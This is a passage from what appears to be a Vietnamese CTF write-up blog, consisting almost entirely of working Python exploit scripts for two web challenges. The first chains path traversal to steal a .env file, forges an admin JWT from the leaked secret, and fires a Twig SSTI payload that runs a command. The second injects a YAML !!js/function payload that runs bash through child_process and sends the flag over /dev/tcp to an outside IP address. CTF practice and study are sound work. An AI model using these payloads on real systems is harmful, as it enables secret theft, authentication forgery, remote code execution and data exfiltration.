            <span class="s2">&#34;dwn_strNm&#34;</span><span class="p">:</span> <span class="s2">&#34;../../../../../../proc/self/root/var/www/backoffice/.env&#34;</span><span class="p">,</span>
            <span class="s2">&#34;dwn_strView&#34;</span><span class="p">:</span> <span class="mi">0</span>
            <span class="p">}</span>
    <span class="p">)</span>

    <span class="n">file_result</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./backoffice-env&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">file_result</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">jwt_generate</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">AUTHORIZATION</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./backoffice-env&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">filedata</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>

    <span class="n">secret</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
    <span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">filedata</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;JWT_SECRET&#39;</span><span class="p">)):</span>
            <span class="n">secret</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;JWT SECRET: {secret}&#34;</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;sub&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;James Park&#34;</span><span class="p">,</span>
        <span class="s2">&#34;email&#34;</span><span class="p">:</span> <span class="s2">&#34;administrator@novition.org&#34;</span><span class="p">,</span>
        <span class="s2">&#34;role&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
        <span class="s2">&#34;iat&#34;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">(),</span>
        <span class="s2">&#34;exp&#34;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span> <span class="o">+</span> <span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">hours</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span>
    <span class="p">}</span>
    <span class="n">AUTHORIZATION</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&#34;HS256&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">AUTHORIZATION</span><span class="p">)</span>


<span class="c1"># twig SSTI</span>
<span class="k">def</span> <span class="nf">ssti</span><span class="p">(</span><span class="n">s</span><span class="p">:</span><span class="n">Session</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span><span class="nb">str</span><span class="p">)</span><span class="o">-&gt;</span><span class="nb">str</span><span class="p">:</span>
    <span class="k">global</span> <span class="n">AUTHORIZATION</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;template_id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
        <span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;asdasdas&#34;</span><span class="p">,</span>
            <span class="s2">&#34;request_details&#34;</span><span class="p">:</span> <span class="s2">&#34;{*kwargs%block U%}/readflag*0passthru{*kwargs</span><span class="si">%e</span><span class="s2">ndblock%}{*kwargs</span><span class="si">%s</span><span class="s2">et x=block(_charset|first)|split(0)%}&#34;</span><span class="p">,</span>
            <span class="s2">&#34;sender_name&#34;</span><span class="p">:</span> <span class="s2">&#34;{*kwargs{x|map(x|last)|join}}&#34;</span><span class="p">,</span>
            <span class="s2">&#34;sender_position&#34;</span><span class="p">:</span> <span class="s2">&#34;asdasdasd&#34;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
        <span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/api/v1/admin/mail/template&#34;</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;bearer {AUTHORIZATION}&#34;</span><span class="p">},</span>
        <span class="n">json</span><span class="o">=</span><span class="n">data</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">):</span>
        <span class="nb">exit</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;ssti failed : {resp.status_code} {resp.text}&#39;</span><span class="p">)</span>

    <span class="n">flag</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span>
    <span class="k">return</span> <span class="n">flag</span>

<span class="k">def</span> <span class="nf">account</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="n">Session</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span><span class="o">-&gt;</span><span class="nb">str</span><span class="p">:</span>
    <span class="k">global</span> <span class="n">AUTHORIZATION</span>
    <span class="n">_csrf</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
    <span class="n">credentials</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">))),</span>
        <span class="s2">&#34;phone_number&#34;</span><span class="p">:</span> <span class="s2">&#34;010-&#34;</span> <span class="o">+</span> <span class="n">f</span><span class="s2">&#34;{random.randint(1000, 9999)}-{random.randint(1000, 9999)}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;birthday&#34;</span><span class="p">:</span> <span class="s2">&#34;20250131&#34;</span><span class="p">,</span>
        <span class="s2">&#34;rrn&#34;</span><span class="p">:</span> <span class="n">f</span><span class="s2">&#34;{random.randint(100000, 999999)}-{random.randint(1000000, 9999999)}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;email&#34;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">)))</span> <span class="o">+</span> <span class="s2">&#34;@novition.org&#34;</span><span class="p">,</span>
        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">)))</span>
    <span class="p">}</span>
    <span class="k">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">credentials</span><span class="p">))</span>
    <span class="c1"># register</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
        <span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="s2">&#34;/api/v1/register&#34;</span><span class="p">,</span>
        <span class="n">json</span><span class="o">=</span><span class="n">credentials</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">201</span><span class="p">):</span>
        <span class="nb">exit</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;register failedval&#39;</span><span class="p">)</span>

    <span class="c1"># login</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="s2">&#34;/login&#34;</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
    <span class="n">token_input</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;_token&#39;</span><span class="p">})</span>
    <span class="n">_csrf</span> <span class="o">=</span> <span class="n">token_input</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="n">token_input</span> <span class="k">else</span> <span class="bp">None</span>


    <span class="k">if</span> <span class="p">(</span><span class="ow">not</span> <span class="n">_csrf</span><span class="p">):</span>
        <span class="nb">exit</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;csrf token not gett&#39;</span><span class="p">)</span>

    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
        <span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/login&#34;</span><span class="p">,</span>
        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;_token&#34;</span><span class="p">:</span> <span class="n">_csrf</span><span class="p">,</span><span class="s2">&#34;email&#34;</span><span class="p">:</span> <span class="n">credentials</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">credentials</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">],</span> <span class="s2">&#34;role&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;sibmit&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">}</span>
    <span class="p">)</span>

    <span class="c1"># get jwt token</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="o">+</span><span class="s2">&#34;/dashboard&#34;</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
    <span class="n">jwt_token_input</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;jwt_token&#39;</span><span class="p">})</span>
    <span class="n">AUTHORIZATION</span> <span class="o">=</span> <span class="n">jwt_token_input</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="n">token_input</span> <span class="k">else</span> <span class="bp">None</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span>  <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:18080&#34;</span>

    <span class="n">s</span> <span class="o">=</span> <span class="n">Session</span><span class="p">()</span>
    <span class="n">account</span><span class="p">(</span><span class="n">s</span><span class="o">=</span><span class="n">s</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">)</span>

    <span class="n">file_download</span><span class="p">(</span><span class="n">s</span><span class="o">=</span><span class="n">s</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">)</span>
    <span class="n">jwt_generate</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Administrator AUTHORIZATION: {AUTHORIZATION}&#34;</span><span class="p">)</span>

    <span class="n">FLAG</span> <span class="o">=</span> <span class="n">ssti</span><span class="p">(</span><span class="n">s</span><span class="o">=</span><span class="n">s</span><span class="p">,</span> <span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
</code></pre></div><h2 id="chas-point">cha&rsquo;s point</h2>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">USERID</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
<span class="n">USERPW</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://&#34;</span><span class="o">+</span> <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/auth/register&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">USERID</span><span class="p">,</span> 
    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">USERPW</span>
<span class="p">})</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://&#34;</span><span class="o">+</span> <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/auth/login&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">USERID</span><span class="p">,</span> 
    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">USERPW</span>
<span class="p">},</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Location&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;/&#34;</span><span class="p">):</span>
    <span class="n">cookie</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Set-Cookie&#34;</span><span class="p">]</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;fuck&#34;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>


<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;{&#34;title&#34;:&#34;chacha&#34;,&#34;highlightTheme&#34;:&#34;</span><span class="se">\\</span><span class="s2">ud800</span><span class="se">\\</span><span class="s2">u000drevealOptions:</span><span class="se">\u0020</span><span class="s2">{</span><span class="se">\\</span><span class="s2">u0022toJSON</span><span class="se">\\</span><span class="s2">u0022:</span><span class="se">\\</span><span class="s2">u0020!!js/function </span><span class="se">\\</span><span class="s2">u0022function </span><span class="se">\\</span><span class="s2">u005cx28</span><span class="se">\\</span><span class="s2">u005cx29 {global.process.mainModule.require</span><span class="se">\\</span><span class="s2">u005cx28</span><span class="se">\\</span><span class="s2">u005cx27child_process</span><span class="se">\\</span><span class="s2">u005cx27</span><span class="se">\\</span><span class="s2">u005cx29.execSync</span><span class="se">\\</span><span class="s2">u005cx28</span><span class="se">\\</span><span class="s2">u005cx60bash -c </span><span class="se">\\</span><span class="s2">u005cx27/readflag</span><span class="se">\\</span><span class="s2">u005cx3e/dev/tcp/43.200.33.70/1234</span><span class="se">\\</span><span class="s2">u005cx27</span><span class="se">\\</span><span class="s2">u005cx60</span><span class="se">\\</span><span class="s2">u005cx29}</span><span class="se">\\</span><span class="s2">u0022}&#34;,&#34;theme&#34;:&#34;s&#34;}&#34;&#34;&#34;</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;&#34;&#34;POST /edit/add/config HTTP/1.1
</span><span class="s2">Host: 43.200.33.70:1234
</span><span class="s2">User-Agent: python-requests/2.31.0
</span><span class="s2">Accept-Encoding: gzip, deflate, br
</span><span class="s2">Accept: */*
</span><span class="s2">Connection: Close
</span><span class="s2">Cookie: {cookie}
</span><span class="s2">Content-Length: {len(payload)}
</span><span class="s2">Content-Type: application/json
</span><span class="s2">
</span><span class="s2">{payload}&#34;&#34;&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;success&#34;</span> <span class="ow">in</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;go&#34;</span><span class="p">)</span>


<span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://localhost/view/render&#34;</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Cookie&#34;</span><span class="p">:</span><span class="n">cookie</span><span class="p">})</span>
</code></pre></div><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Malformed_URI">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Malformed_URI</a></p>


        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/write-up/2023-01-14-cookiearena/" data-toggle="tooltip" data-placement="top" title="Cookie arena">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://l3mnt2010.github.io/write-up/2024-04-17-codegatectf2024quals/" data-toggle="tooltip" data-placement="top" title="CodegateCTF 2024 quals">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

